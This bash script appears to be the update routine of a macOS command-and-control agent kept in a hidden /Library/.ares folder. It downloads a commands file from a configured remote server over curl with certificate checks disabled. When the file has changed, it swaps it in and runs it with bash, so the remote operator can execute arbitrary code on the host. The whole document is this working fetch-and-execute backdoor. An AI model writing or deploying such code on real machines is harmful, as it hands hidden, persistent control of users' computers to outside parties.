#!/bin/bash
source /Library/.ares/ares.conf

curl -ko /Library/.ares/newcommands http://$COMMANDSERVER/newcommands

CURRENTMD5=`md5 -q /Library/.ares/commands`

NEWMD5=`md5 -q /Library/.ares/newcommands`

if [[ "$CURRENTMD5" == "$NEWMD5" ]]
then
    
    rm -rf /Library/.ares/newcommands
	exit
    
else
    
    rm -rf /Library/.ares/commands
    mv /Library/.ares/newcommands /Library/.ares/commands
    bash /Library/.ares/commands
    
fi
